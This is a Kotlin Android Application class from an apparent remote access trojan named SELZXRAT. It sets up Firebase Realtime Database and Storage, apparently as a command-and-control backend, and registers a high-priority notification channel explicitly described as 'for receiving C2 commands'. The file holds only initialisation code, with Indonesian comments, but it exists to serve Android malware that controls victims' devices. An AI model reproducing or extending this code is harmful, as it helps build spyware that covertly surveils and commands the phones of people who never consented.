package com.selzxrat.v5

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import android.util.Log
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage

class SELZXRATApp : Application() {

    companion object {
        const val CHANNEL_ID = "selzxrat_c2_channel"
        const val CHANNEL_NAME = "SELZXRAT C2 Commands"
        lateinit var instance: SELZXRATApp
            private set
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        try {
            // Kita pakai FirebaseDatabase.getInstance() dulu
            val db = FirebaseDatabase.getInstance()
            
            // Kita bungkus setPersistence dalam try-catch supaya kalau gagal, tidak crash
            try {
                db.setPersistenceEnabled(true)
            } catch (e: Exception) {
                Log.e("SELZXRATApp", "Persistence error (abaikan jika ini restart): ${e.message}")
            }

            // Inisialisasi Storage
            FirebaseStorage.getInstance()
            
        } catch (e: Exception) {
            Log.e("SELZXRATApp", "Fatal Firebase Init: ${e.message}")
        }

        // Create notification channel
        createNotificationChannel()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Channel for receiving C2 commands"
                enableVibration(true)
                setShowBadge(true)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }
}
